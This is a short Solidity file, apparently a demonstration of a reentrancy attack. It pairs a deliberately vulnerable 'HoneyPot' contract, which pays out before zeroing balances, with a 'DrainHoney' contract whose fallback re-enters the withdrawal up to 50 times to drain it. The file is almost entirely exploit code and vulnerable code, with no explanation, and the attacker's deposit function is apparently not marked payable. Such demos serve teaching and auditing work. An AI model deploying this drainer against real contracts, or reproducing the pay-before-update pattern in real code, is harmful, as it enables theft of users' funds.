pragma solidity ^0.4.13;

// Another example of draining contracts

contract HoneyPot {
    mapping (address => uint) public balances;

    function HoneyPot() payable {
        put();
    }

    function put() payable {
        balances[msg.sender] = msg.value;
    }

    function get() {
        require(msg.sender.call.value(balances[msg.sender])());
        balances[msg.sender] = 0;
    }

    function() {
        revert();
    }
}

contract DrainHoney {

  HoneyPot hp;
  uint loop;

  function DrainHoney(address _contract) {
    hp = HoneyPot(_contract);
  }
  // send 0.1 first
  function sendMoney() {
    hp.put.call.value(msg.value)();
  }
  // call get next
  function get() {
    hp.get();
  }

  function() payable {
     if (loop < 50) {
       loop++;
       hp.get();
     }
  }
}
